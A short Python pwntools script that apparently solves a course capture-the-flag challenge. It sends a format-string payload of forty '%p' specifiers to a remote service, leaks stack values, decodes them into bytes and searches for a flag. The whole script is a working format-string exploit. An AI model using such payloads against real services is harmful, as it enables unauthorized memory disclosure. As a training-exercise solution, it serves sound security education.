from pwn import *

p = remote('152.118.201.241', 3011)

payload = ("%p " * 40).encode()
p.sendlineafter(b"Name: ", payload)

data = p.recvall().decode(errors="ignore")

vals = data.split()

flag = b""

for v in vals:
    if not v.startswith("0x"):
        continue

    try:
        bval = p64(int(v,16))
    except:
        continue

    flag += bval

print(flag)

# cari flag
import re
m = re.search(b"CSCE604258{.*?}", flag)
if m:
    print(m.group().decode())